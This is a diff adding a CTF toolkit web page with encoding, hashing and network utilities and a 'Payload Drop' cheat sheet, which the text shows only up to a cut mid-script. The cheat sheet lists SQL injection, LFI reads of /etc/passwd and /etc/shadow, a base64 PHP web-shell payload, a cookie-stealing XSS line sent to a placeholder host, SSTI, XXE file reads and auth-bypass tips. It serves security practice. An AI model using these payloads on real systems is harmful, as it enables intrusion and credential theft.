@@ -1,0 +1,1226 @@
+---
+import BaseLayout from '../layouts/BaseLayout.astro';
+---
+
+<BaseLayout 
+  title="Toolkit" 
+  description="Client-side utilities and payload drop for rapid CTF operations." 
+  activePage="arsenal"
+  extraCss={['/styles/arsenal.css']}
+>
+  <div class="hud-tab-wrapper">
+    <div class="arsenal-hud-tabs">
+      <button class="hud-tab active" data-view="local-tools-view">
+        <span class="hud-indicator"></span> Local Tools
+      </button>
+      <button class="hud-tab" data-view="external-links-view">
+        <span class="hud-indicator"></span> External Links
+      </button>
+    </div>
+  </div>
+
+  <!-- VIEW 1: Local Tools -->
+  <div id="local-tools-view" class="hud-view active">
+    <div class="arsenal-container">
+    
+    <!-- Sidebar Navigation -->
+    <aside class="arsenal-sidebar">
+      <div class="hud-diagnostics">
+        <div class="hud-diag-row">
+          <span>STATUS:</span>
+          <span class="hud-diag-val"><span class="hud-pulse"></span>ONLINE</span>
+        </div>
+        <div class="hud-diag-row">
+          <span>SECURE_LINK:</span>
+          <span class="hud-diag-val">ACTIVE</span>
+        </div>
+        <div class="hud-diag-row">
+          <span>SYS_DECRYPT:</span>
+          <span class="hud-diag-val">READY</span>
+        </div>
+      </div>
+
+      <div class="arsenal-sidebar-group">
+        <div class="arsenal-sidebar-title">Cryptography</div>
+        <nav class="arsenal-sidebar-nav">
+          <button class="arsenal-nav-btn active" data-target="tool-decoder">Decoder Ring</button>
+          <button class="arsenal-nav-btn" data-target="tool-rot">ROT Cipher</button>
+          <button class="arsenal-nav-btn" data-target="tool-vigenere">Vigenère Cipher</button>
+
+          <button class="arsenal-nav-btn" data-target="tool-xor">XOR Tool</button>
+        </nav>
+      </div>
+      
+      <div class="arsenal-sidebar-group">
+        <div class="arsenal-sidebar-title">Hashing & Forensics</div>
+        <nav class="arsenal-sidebar-nav">
+          <button class="arsenal-nav-btn" data-target="tool-hashgen">Hash Generator</button>
+          <button class="arsenal-nav-btn" data-target="tool-hashid">Hash Identifier</button>
+          <button class="arsenal-nav-btn" data-target="tool-magic">Magic Bytes</button>
+          <button class="arsenal-nav-btn" data-target="tool-time">Timestamp Conv</button>
+        </nav>
+      </div>
+
+      <div class="arsenal-sidebar-group">
+        <div class="arsenal-sidebar-title">Networking</div>
+        <nav class="arsenal-sidebar-nav">
+          <button class="arsenal-nav-btn" data-target="tool-ip">IP Converter</button>
+          <button class="arsenal-nav-btn" data-target="tool-cidr">CIDR Calculator</button>
+        </nav>
+      </div>
+
+      <div class="arsenal-sidebar-group">
+        <div class="arsenal-sidebar-title">Offensive</div>
+        <nav class="arsenal-sidebar-nav">
+          <button class="arsenal-nav-btn" data-target="tool-payloads">Payload Drop</button>
+        </nav>
+      </div>
+    </aside>
+
+    <!-- Main Content Area -->
+    <main class="arsenal-main">
+      
+      <!-- TOOL: Decoder Ring -->
+      <section id="tool-decoder" class="arsenal-tool-panel active">
+        <div class="tool-header">
+          <h1 class="tool-title" data-scramble="DECODER RING">DECODER RING</h1>
+          <p class="tool-desc">Base64, URL, and Hexadecimal conversion.</p>
+        </div>
+        <div class="tool-section fade-up">
+          <div class="tool-grid-2">
+            <div class="form-group">
+              <label class="form-label">Input Data</label>
+              <textarea id="decoder-in" class="form-textarea" placeholder="Paste data here..."></textarea>
+            </div>
+            <div class="form-group">
+              <label class="form-label">Output Data</label>
+              <div id="decoder-out" class="result-box empty">Result will appear here...<button class="copy-btn" onclick="copyResult('decoder-out')">Copy</button></div>
+            </div>
+          </div>
+          <div class="button-group">
+            <button class="btn btn-primary" onclick="decodeRun('b64enc')">B64 Encode</button>
+            <button class="btn" onclick="decodeRun('b64dec')">B64 Decode</button>
+            <button class="btn btn-primary" onclick="decodeRun('urlenc')">URL Encode</button>
+            <button class="btn" onclick="decodeRun('urldec')">URL Decode</button>
+            <button class="btn btn-primary" onclick="decodeRun('hexenc')">Hex Encode</button>
+            <button class="btn" onclick="decodeRun('hexdec')">Hex Decode</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- TOOL: ROT Cipher -->
+      <section id="tool-rot" class="arsenal-tool-panel">
+        <div class="tool-header">
+          <h1 class="tool-title" data-scramble="ROT CIPHER">ROT CIPHER</h1>
+          <p class="tool-desc">Shift characters by N positions (e.g. ROT13). Monoalphabetic substitution.</p>
+        </div>
+        <div class="tool-section fade-up">
+          <div class="tool-grid-2">
+            <div>
+              <div class="form-group">
+                <label class="form-label">Input Text</label>
+                <textarea id="rot-in" class="form-textarea" placeholder="Veni, vidi, vici..."></textarea>
+              </div>
+              <div class="form-group">
+                <label class="form-label">Shift Amount (1-25)</label>
+                <input type="number" id="rot-shift" class="form-input" value="13" min="1" max="25" />
+              </div>
+            </div>
+            <div class="form-group">
+              <label class="form-label">Output</label>
+              <div id="rot-out" class="result-box empty">Result will appear here...<button class="copy-btn" onclick="copyResult('rot-out')">Copy</button></div>
+            </div>
+          </div>
+          <div class="button-group">
+            <button class="btn btn-primary" onclick="rotRun('encode')">Encode</button>
+            <button class="btn" onclick="rotRun('decode')">Decode</button>
+            <button class="btn" onclick="rotRun('all')">Show All</button>
+            <button class="btn" style="border: 1px solid var(--accent); color: var(--accent); background: transparent;" onclick="rotRun('auto')">Auto-Decode</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- TOOL: Vigenère Cipher -->
+      <section id="tool-vigenere" class="arsenal-tool-panel">
+        <div class="tool-header">
+          <h1 class="tool-title" data-scramble="VIGENÈRE CIPHER">VIGENÈRE CIPHER</h1>
+          <p class="tool-desc">Polyalphabetic substitution cipher using a text key.</p>
+        </div>
+        <div class="tool-section fade-up">
+          <div class="tool-grid-2">
+            <div>
+              <div class="form-group">
+                <label class="form-label">Input Text</label>
+                <textarea id="vigenere-in" class="form-textarea" placeholder="Text to encode or decode..."></textarea>
+              </div>
+              <div class="form-group">
+                <label class="form-label">Key (Alphabetic)</label>
+                <input type="text" id="vigenere-key" class="form-input" placeholder="e.g. SECRET" />
+              </div>
+            </div>
+            <div class="form-group">
+              <label class="form-label">Output</label>
+              <div id="vigenere-out" class="result-box empty">Result will appear here...<button class="copy-btn" onclick="copyResult('vigenere-out')">Copy</button></div>
+            </div>
+          </div>
+          <div class="button-group">
+            <button class="btn btn-primary" onclick="vigenereRun('encode')">Encode</button>
+            <button class="btn" onclick="vigenereRun('decode')">Decode</button>
+            <button class="btn" style="border: 1px solid var(--accent); color: var(--accent); background: transparent;" onclick="vigenereRun('auto')">Auto-Decode (Crack)</button>
+          </div>
+        </div>
+      </section>
+
+
+      <!-- TOOL: XOR Tool -->
+      <section id="tool-xor" class="arsenal-tool-panel">
+        <div class="tool-header">
+          <h1 class="tool-title" data-scramble="XOR TOOL">XOR TOOL</h1>
+          <p class="tool-desc">Perform bitwise XOR. Auto-detects hex vs plaintext inputs.</p>
+        </div>
+        <div class="tool-section fade-up">
+          <div class="tool-grid-2">
+            <div>
+              <div class="form-group">
+                <label class="form-label">Input Data</label>
+                <textarea id="xor-in" class="form-textarea" placeholder="Data to XOR (hex or text)..."></textarea>
+              </div>
+              <div class="form-group">
+                <label class="form-label">Key</label>
+                <input type="text" id="xor-key" class="form-input" placeholder="Key (hex or text)..." />
+              </div>
+            </div>
+            <div>
+              <div class="form-group">
+                <label class="form-label">Output (Hex)</label>
+                <div id="xor-out-hex" class="result-box empty">Hex output...<button class="copy-btn" onclick="copyResult('xor-out-hex')">Copy</button></div>
+              </div>
+              <div class="form-group">
+                <label class="form-label">Output (ASCII)</label>
+                <div id="xor-out-ascii" class="result-box empty">ASCII output...<button class="copy-btn" onclick="copyResult('xor-out-ascii')">Copy</button></div>
+              </div>
+            </div>
+          </div>
+          <div class="button-group">
+            <button class="btn btn-primary" onclick="xorRun()">Execute XOR</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- TOOL: Hash Generator -->
+      <section id="tool-hashgen" class="arsenal-tool-panel">
+        <div class="tool-header">
+          <h1 class="tool-title" data-scramble="HASH GENERATOR">HASH GENERATOR</h1>
+          <p class="tool-desc">Real-time MD5, SHA-1, SHA-256, and SHA-512 calculation.</p>
+        </div>
+        <div class="tool-section fade-up">
+          <div class="tool-grid-2">
+            <div class="form-group">
+              <label class="form-label">Input String</label>
+              <textarea id="hashgen-in" class="form-textarea" placeholder="Type to hash..." oninput="hashRun()"></textarea>
+            </div>
+            <div>
+              <div class="form-group">
+                <label class="form-label">MD5</label>
+                <div id="hashgen-md5" class="result-box empty">...<button class="copy-btn" onclick="copyResult('hashgen-md5')">Copy</button></div>
+              </div>
+              <div class="form-group">
+                <label class="form-label">SHA-1</label>
+                <div id="hashgen-sha1" class="result-box empty">...<button class="copy-btn" onclick="copyResult('hashgen-sha1')">Copy</button></div>
+              </div>
+              <div class="form-group">
+                <label class="form-label">SHA-256</label>
+                <div id="hashgen-sha256" class="result-box empty">...<button class="copy-btn" onclick="copyResult('hashgen-sha256')">Copy</button></div>
+              </div>
+              <div class="form-group">
+                <label class="form-label">SHA-512</label>
+                <div id="hashgen-sha512" class="result-box empty">...<button class="copy-btn" onclick="copyResult('hashgen-sha512')">Copy</button></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- TOOL: Hash Identifier -->
+      <section id="tool-hashid" class="arsenal-tool-panel">
+        <div class="tool-header">
+          <h1 class="tool-title" data-scramble="HASH IDENTIFIER">HASH IDENTIFIER</h1>
+          <p class="tool-desc">Analyze a hash structure to determine possible algorithm types.</p>
+        </div>
+        <div class="tool-section fade-up">
+          <div class="tool-grid-2">
+            <div class="form-group">
+              <label class="form-label">Unknown Hash</label>
+              <input type="text" id="hashid-in" class="form-input" placeholder="e.g. 5d41402abc4b2a76b9719d911017c592" oninput="hashIdRun()" />
+            </div>
+            <div class="form-group">
+              <label class="form-label">Possible Matches</label>
+              <div id="hashid-out" class="result-box empty">Awaiting input...</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- TOOL: Magic Bytes -->
+      <section id="tool-magic" class="arsenal-tool-panel">
+        <div class="tool-header">
+          <h1 class="tool-title" data-scramble="MAGIC BYTES">MAGIC BYTES</h1>
+          <p class="tool-desc">Identify file types from their hexadecimal signatures.</p>
+        </div>
+        <div class="tool-section fade-up">
+          <div class="tool-grid-2">
+            <div class="form-group">
+              <label class="form-label">File Header (Hex)</label>
+              <input type="text" id="magic-in" class="form-input" placeholder="e.g. 89 50 4E 47 or 89504E47" oninput="magicRun()" />
+            </div>
+            <div class="form-group">
+              <label class="form-label">File Type</label>
+              <div id="magic-out" class="result-box empty">Awaiting signature...</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- TOOL: Magic Bytes -->
+      <!-- TOOL: Timestamp Converter -->
+      <section id="tool-time" class="arsenal-tool-panel">
+        <div class="tool-header">
+          <h1 class="tool-title" data-scramble="TIMESTAMP CONV">TIMESTAMP CONV</h1>
+          <p class="tool-desc">Convert between Unix Epoch and human-readable dates.</p>
+        </div>
+        <div class="tool-section fade-up">
+          <div class="tool-grid-2">
+            <div>
+              <h3 class="tool-section-title">Unix to Date</h3>
+              <div class="form-group">
+                <input type="number" id="time-unix-in" class="form-input" placeholder="e.g. 1721748234" oninput="timeUnixRun()" />
+              </div>
+              <div class="form-group">
+                <div id="time-unix-out" class="result-box empty">Output...</div>
+              </div>
+            </div>
+            <div>
+              <h3 class="tool-section-title">Date to Unix</h3>
+              <div class="form-group">
+                <input type="datetime-local" id="time-date-in" class="form-input" onchange="timeDateRun()" />
+              </div>
+              <div class="form-group">
+                <div id="time-date-out" class="result-box empty">Output...</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- TOOL: IP Converter -->
+      <section id="tool-ip" class="arsenal-tool-panel">
+        <div class="tool-header">
+          <h1 class="tool-title" data-scramble="IP CONVERTER">IP CONVERTER</h1>
+          <p class="tool-desc">Convert IPv4 addresses to alternate representations (useful for SSRF bypass).</p>
+        </div>
+        <div class="tool-section fade-up">
+          <div class="tool-grid-2">
+            <div class="form-group">
+              <label class="form-label">IPv4 Address</label>
+              <input type="text" id="ip-in" class="form-input" placeholder="e.g. 192.168.1.1" oninput="ipRun()" />
+            </div>
+            <div>
+              <div class="form-group">
+                <label class="form-label">Hexadecimal</label>
+                <div id="ip-out-hex" class="result-box empty">...<button class="copy-btn" onclick="copyResult('ip-out-hex')">Copy</button></div>
+              </div>
+              <div class="form-group">
+                <label class="form-label">Integer (Decimal)</label>
+                <div id="ip-out-int" class="result-box empty">...<button class="copy-btn" onclick="copyResult('ip-out-int')">Copy</button></div>
+              </div>
+              <div class="form-group">
+                <label class="form-label">Binary</label>
+                <div id="ip-out-bin" class="result-box empty">...<button class="copy-btn" onclick="copyResult('ip-out-bin')">Copy</button></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- TOOL: CIDR Calculator -->
+      <section id="tool-cidr" class="arsenal-tool-panel">
+        <div class="tool-header">
+          <h1 class="tool-title" data-scramble="CIDR CALCULATOR">CIDR CALCULATOR</h1>
+          <p class="tool-desc">Calculate network boundaries and usable host ranges.</p>
+        </div>
+        <div class="tool-section fade-up">
+          <div class="tool-grid-2">
+            <div class="form-group">
+              <label class="form-label">IP Address / CIDR</label>
+              <input type="text" id="cidr-in" class="form-input" placeholder="e.g. 192.168.1.5/24" oninput="cidrRun()" />
+            </div>
+            <div class="form-group">
+              <label class="form-label">Calculated Boundaries</label>
+              <div id="cidr-out" class="result-box empty">Results...</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- TOOL: Payload Drop -->
+      <section id="tool-payloads" class="arsenal-tool-panel">
+        <div class="tool-header">
+          <h1 class="tool-title" data-scramble="PAYLOAD DROP">PAYLOAD DROP</h1>
+          <p class="tool-desc">Quick-copy cheat sheet for vulnerability testing.</p>
+        </div>
+        
+        <div class="payload-search-bar fade-up">
+          <svg class="payload-search-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+          </svg>
+          <input type="text" id="payload-search" class="payload-search-input" placeholder="Search payloads (e.g. 'SQLi', 'passwd')..." oninput="filterPayloads()" />
+        </div>
+
+        <div class="tool-section fade-up payload-category" data-category="SQL Injection">
+          <h3 class="tool-section-title">SQL Injection (Auth Bypass)</h3>
+          <div class="payload-list">
+            <div class="payload-item"><code class="payload-code">' OR '1'='1</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">' OR '1'='1' --</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">admin'--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">' OR 1=1--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">" OR ""="</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+          </div>
+          
+          <h3 class="tool-section-title" style="margin-top: 1.5rem;">SQL Injection (Error Probes)</h3>
+          <div class="payload-list">
+            <div class="payload-item"><code class="payload-code">'</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">''</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">`</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">')</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">"))</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+          </div>
+
+          <h3 class="tool-section-title" style="margin-top: 1.5rem;">SQL Injection (UNION & Time)</h3>
+          <div class="payload-list">
+            <div class="payload-item"><code class="payload-code">' ORDER BY 1--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">' ORDER BY 2--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">' UNION SELECT NULL--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">' UNION SELECT NULL,NULL--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">' AND SLEEP(5)--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">'; WAITFOR DELAY '0:0:5'--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">' AND 1=IF(1=1,SLEEP(5),0)--</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+          </div>
+        </div>
+
+        <div class="tool-section fade-up payload-category" data-category="Local File Inclusion (LFI)">
+          <h3 class="tool-section-title">Local File Inclusion (LFI)</h3>
+          <div class="payload-list">
+            <div class="payload-item"><code class="payload-code">../../../etc/passwd</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">....//....//....//etc/passwd</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">..%2F..%2F..%2Fetc%2Fpasswd</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">/etc/passwd</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">/etc/shadow</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">/proc/self/environ</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">/var/log/apache2/access.log</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">php://filter/convert.base64-encode/resource=index.php</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">php://input</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+          </div>
+        </div>
+
+        <div class="tool-section fade-up payload-category" data-category="Cross-Site Scripting (XSS)">
+          <h3 class="tool-section-title">Cross-Site Scripting (XSS)</h3>
+          <div class="payload-list">
+            <div class="payload-item"><code class="payload-code">&lt;script&gt;alert(1)&lt;/script&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">&lt;img src=x onerror=alert(1)&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">&lt;img src=x onerror=alert`1`&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">javascript:alert(1)</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">&lt;svg onload=alert(1)&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item">
+              <code class="payload-code" data-template="&lt;script&gt;fetch('$$0$$/?c='+document.cookie)&lt;/script&gt;">&lt;script&gt;fetch('<input type="text" class="payload-input-inline" placeholder="https://YOURURL" />/?c='+document.cookie)&lt;/script&gt;</code>
+              <button class="payload-copy" onclick="copyTemplatePayload(this)">Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="tool-section fade-up payload-category" data-category="Server-Side Template Injection (SSTI)">
+          <h3 class="tool-section-title">Server-Side Template Injection (SSTI)</h3>
+          <div class="payload-list">
+            <div class="payload-item"><code class="payload-code">{"{{7*7}}"}</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">${7*7}</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">&lt;%= 7*7 %&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">#{7*7}</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">{"{{config}}"}</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">{"{{self.__class__.__mro__[1].__subclasses__()}}"}</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">{"{{_self.env.registerUndefinedFilterCallback(\"exec\")}}"}</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+          </div>
+        </div>
+
+        <div class="tool-section fade-up payload-category" data-category="XML External Entity (XXE)">
+          <h3 class="tool-section-title">XML External Entity (XXE)</h3>
+          <div class="payload-list">
+            <div class="payload-item"><code class="payload-code">&lt;?xml version="1.0"?&gt;&#10;&lt;!DOCTYPE root [&lt;!ENTITY test "hello"&gt;]&gt;&#10;&lt;root&gt;&amp;test;&lt;/root&gt;</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item">
+              <code class="payload-code" data-template="&lt;?xml version=&quot;1.0&quot;?&gt;&#10;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///$$0$$&quot;&gt;]&gt;&#10;&lt;root&gt;&amp;xxe;&lt;/root&gt;">&lt;?xml version="1.0"?&gt;&#10;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///<input type="text" class="payload-input-inline" placeholder="etc/passwd" />"&gt;]&gt;&#10;&lt;root&gt;&amp;xxe;&lt;/root&gt;</code>
+              <button class="payload-copy" onclick="copyTemplatePayload(this)">Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="tool-section fade-up payload-category" data-category="Open Redirect & IDOR">
+          <h3 class="tool-section-title">Open Redirect Probes</h3>
+          <div class="payload-list">
+            <div class="payload-item"><code class="payload-code">/redirect?url=https://evil.com</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">?next=//evil.com</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+            <div class="payload-item"><code class="payload-code">?return=javascript:alert(1)</code><button class="payload-copy" onclick="copyPayload(this)">Copy</button></div>
+          </div>
+          
+          <h3 class="tool-section-title" style="margin-top: 1.5rem;">IDOR / Auth Testing Tips</h3>
+          <div class="payload-list">
+            <div class="payload-item" style="color: var(--silver); font-family: var(--font-mono); font-size: 0.95rem;">> Change id=1 to id=2 (or negative/array values)</div>
+            <div class="payload-item" style="color: var(--silver); font-family: var(--font-mono); font-size: 0.95rem;">> Change user=admin to user=test</div>
+            <div class="payload-item" style="color: var(--silver); font-family: var(--font-mono); font-size: 0.95rem;">> Modify JWT role claims (None alg, signature strip)</div>
+            <div class="payload-item" style="color: var(--silver); font-family: var(--font-mono); font-size: 0.95rem;">> Remove Authorization header entirely</div>
+          </div>
+        </div>
+
+      </section>
+
+    </main>
+  </div> <!-- Close arsenal-container -->
+  </div> <!-- Close local-tools-view -->
+
+  <!-- VIEW 2: External Resources -->
+  <div id="external-links-view" class="hud-view">
+    <div class="external-container">
+      <div class="tool-header">
+        <h1 class="tool-title" data-scramble="SATELLITE INTELLIGENCE">SATELLITE INTELLIGENCE</h1>
+        <p class="tool-desc">Curated external systems, decoders, and cheat sheets to assist during CTF operations.</p>
+      </div>
+
+      <div class="links-grid">
+        <!-- Cryptography & Encodings -->
+        <div class="link-category-card">
+          <h3 class="link-category-title">Decoders & Cryptography</h3>
+          <ul class="link-list">
+            <li>
+              <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">CyberChef</span>
+                <p class="link-desc">The ultimate cyber tool for decoding, encoding, parsing, and formatting data.</p>
+              </a>
+            </li>
+            <li>
+              <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">CrackStation</span>
+                <p class="link-desc">Pre-computed hash lookup tables for breaking MD5, SHA1, SHA256, and bcrypt hashes.</p>
+              </a>
+            </li>
+            <li>
+              <a href="https://www.dcode.fr/en" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">dCode</span>
+                <p class="link-desc">Massive platform for solving ciphers, codes, logic puzzles, and esoteric languages.</p>
+              </a>
+            </li>
+            <li>
+              <a href="https://jwt.io/" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">JWT.io</span>
+                <p class="link-desc">Decode, verify and generate JSON Web Tokens (JWT) for testing authentication mechanisms.</p>
+              </a>
+            </li>
+          </ul>
+        </div>
+
+        <!-- Web Exploitation -->
+        <div class="link-category-card">
+          <h3 class="link-category-title">Web Exploitation</h3>
+          <ul class="link-list">
+            <li>
+              <a href="https://www.revshells.com/" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">Reverse Shell Generator</span>
+                <p class="link-desc">Interactive wizard to generate listener configurations and shell commands in dozens of formats.</p>
+              </a>
+            </li>
+            <li>
+              <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">PayloadsAllTheThings</span>
+                <p class="link-desc">Comprehensive repository of cheat sheets, bypass payloads, and methodology checklists.</p>
+              </a>
+            </li>
+            <li>
+              <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">HackTricks</span>
+                <p class="link-desc">Wiki containing exploitation and privilege escalation methods for Web, AD, Networks, and OS.</p>
+              </a>
+            </li>
+            <li>
+              <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">SecLists</span>
+                <p class="link-desc">The ultimate collection of multiple types of lists used during security assessments, collected in one place.</p>
+              </a>
+            </li>
+          </ul>
+        </div>
+
+        <!-- Reverse Engineering & Binary Exploitation -->
+        <div class="link-category-card">
+          <h3 class="link-category-title">Reverse Eng & Privilege Escalation</h3>
+          <ul class="link-list">
+            <li>
+              <a href="https://godbolt.org/" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">Compiler Explorer</span>
+                <p class="link-desc">Interact with compilers on the fly, writing code in C/C++ to inspect compiled CPU disassembly.</p>
+              </a>
+            </li>
+            <li>
+              <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">GTFOBins</span>
+                <p class="link-desc">Directory of legitimate Unix binaries usable to bypass security configurations or escalate privileges.</p>
+              </a>
+            </li>
+            <li>
+              <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">LOLBAS</span>
+                <p class="link-desc">Living Off The Land binaries and scripts for bypassing AppLocker, execution, and privilege escalation on Windows.</p>
+              </a>
+            </li>
+          </ul>
+        </div>
+
+        <!-- Reconnaissance & Intelligence -->
+        <div class="link-category-card">
+          <h3 class="link-category-title">OSINT & Reconnaissance</h3>
+          <ul class="link-list">
+            <li>
+              <a href="https://osintframework.com/" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">OSINT Framework</span>
+                <p class="link-desc">Directory map of internet resources, tools, and platforms for deep-web intelligence gathering.</p>
+              </a>
+            </li>
+            <li>
+              <a href="https://www.shodan.io/" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">Shodan</span>
+                <p class="link-desc">Search engine mapping internet-connected systems, webcams, servers, and SCADA infrastructure.</p>
+              </a>
+            </li>
+            <li>
+              <a href="https://intelx.io/" target="_blank" rel="noopener noreferrer" class="link-item">
+                <span class="link-name">Intelligence X</span>
+                <p class="link-desc">Archive database for searching breach dumps, leaked credentials, domain profiles, and historical IPs.</p>
+              </a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="toast-container"></div>
+</BaseLayout>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/core.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/md5.min.js"></script>
+
+<script is:inline>
+  // --- UI Interactions ───
+  // Top View Switching (Local vs Satellite)
+  document.querySelectorAll('.hud-tab').forEach(tab => {
+    tab.addEventListener('click', (e) => {
+      document.querySelectorAll('.hud-tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.hud-view').forEach(v => v.classList.remove('active'));
+      
+      const selectedTab = e.currentTarget;
+      selectedTab.classList.add('active');
+      const viewId = selectedTab.getAttribute('data-view');
+      document.getElementById(viewId).classList.add('active');
+    });
+  });
+
+  // Sidebar Tool Panel Switching
+  document.querySelectorAll('.arsenal-nav-btn').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      const activeBtn = e.currentTarget;
+      
+      // Remove active from all
+      document.querySelectorAll('.arsenal-nav-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.arsenal-tool-panel').forEach(p => p.classList.remove('active'));
+      
+      // Add active to clicked
+      activeBtn.classList.add('active');
+      const targetId = activeBtn.getAttribute('data-target');
+      const targetPanel = document.getElementById(targetId);
+      
+      if (targetPanel) {
+        targetPanel.classList.add('active');
+        
+        // Smooth scroll to the main content container top so the tool is "in front" (great for UX/mobile)
+        const mainContainer = document.querySelector('.arsenal-main');
+        if (mainContainer) {
